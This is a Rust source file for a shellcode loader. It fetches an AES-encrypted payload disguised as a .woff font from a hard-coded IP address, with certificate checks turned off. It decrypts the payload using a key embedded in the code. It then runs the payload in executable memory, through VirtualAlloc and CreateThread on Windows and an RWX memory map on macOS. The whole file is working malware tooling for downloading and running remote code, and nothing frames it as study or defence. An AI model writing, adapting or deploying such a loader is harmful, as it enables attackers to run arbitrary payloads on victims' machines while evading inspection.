//common use
use std::ptr;
use std::process;
use bytes::Bytes;
use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
//windows use
#[cfg(target_os = "windows")]
use winapi::um::winnt::{PVOID, MEM_COMMIT,MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi;
#[cfg(target_os = "windows")]
use winapi::um::synchapi::WaitForSingleObject;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi;
#[cfg(target_os = "windows")]
use winapi::um::winbase;
// macos
#[cfg(target_os = "macos")]
use mmap::{MapOption, MemoryMap};

type DWORD = u32;
type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;

#[cfg(target_os = "windows")]
const URL: &str = "http://192.168.78.129:8080/test.woff";
#[cfg(target_os = "macos>")]
const URL: &str = "http://192.168.78.129:8181/test.woff";

const AESKEY: &str = "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT";
const AESIV: &str  = "8y/B?E(G+KbPeShV";

fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
    let mut key = [0x42; 32];
    let mut iv = [0x24; 16];
    for (i, b) in AESKEY.as_bytes().iter().enumerate() {
        key[i] = *b;
    }
    for (i, b) in AESIV.as_bytes().iter().enumerate() {
        iv[i] = *b;
    }
    let mut buf: Vec<u8> = Vec::with_capacity(size);
    let _pt = Aes256CbcDec::new(&key.into(), &iv.into())
        .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buf)
        .unwrap();
    return buf;
}

fn getscode(url: &str) -> Bytes {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()
        .unwrap();
    let res = match client.get(url).send() {
        Ok(res) => res,
        Err(_) => panic!("")
    };
    let rbytes = match res.bytes() {
        Ok(b) => b,
        Err(_) => panic!("")
    };
    // note, skip the first 16 bytes since they are the IV, might want to remove the IV from being in code and 
    // add it to the decypt function
    let pt = decrypt(&rbytes[16..], rbytes.len());
    let ptb = Bytes::from(pt);
    return ptb;
}

#[cfg(target_os = "macos")]
fn dne() {
    // change this all to memmap2 https://docs.rs/memmap2/0.7.1/memmap2/struct.MmapOptions.html
    let rbytes = getscode(URL);
    unsafe {
        let map = MemoryMap::new(
            rbytes.len(),
            &[
                MapOption::MapAddr(0 as *mut u8),
                MapOption::MapOffset(0),
                MapOption::MapFd(-1),
                MapOption::MapReadable,
                MapOption::MapWritable,
                MapOption::MapExecutable,
                MapOption::MapNonStandardFlags(libc::MAP_ANON),
                MapOption::MapNonStandardFlags(libc::MAP_PRIVATE),
            ],
        )
        .unwrap();

        std::ptr::copy(rbytes.as_ptr(), map.data(), rbytes.len());

        let func: unsafe extern "C" fn() = mem::transmute(map.data());
        func();
    }
}

#[cfg(target_os = "windows")]
fn dne() {
    //download the payload
    let rbytes = getscode(URL);
    // allocate and copy
    unsafe {
        let base_addr = kernel32::VirtualAlloc(ptr::null_mut(), rbytes.len().try_into().unwrap(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if base_addr.is_null() { 
            println!("[-] Couldn't allocate memory to current proc.")
        } else {
            println!("[+] Allocated memory to current proc.");
        }

        std::ptr::copy(rbytes.as_ptr() as  _, base_addr, rbytes.len());

        let mut old_protect: DWORD = PAGE_READWRITE;
        let mem_protect = kernel32::VirtualProtect (
            base_addr,
            rbytes.len() as u64,
            PAGE_EXECUTE_READ,
            &mut old_protect
        );

        if mem_protect == 0 {
            let error = errhandlingapi::GetLastError();
            println!("[-] Error: {}", error.to_string());
            process::exit(0x0100);
        }

        let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };
        let mut tid = 0;
        let h_thread = processthreadsapi::CreateThread(
            ptr::null_mut(),
            0,
            Some(ep),
            ptr::null_mut(),
            0,
            &mut tid
        );
        if h_thread.is_null() {
            let error = errhandlingapi::GetLastError();
            println!("{}", error.to_string())
        
        } else {
            println!("[+] Thread Id: {}", tid)
        }
        // wait 5eva
        let status = WaitForSingleObject(h_thread, winbase::INFINITE);
        if status == 0 {
            println!("d")
        } else {
            let error = errhandlingapi::GetLastError();
            println!("{}", error.to_string())
        }
    }
}

fn main() {
    dne();
}
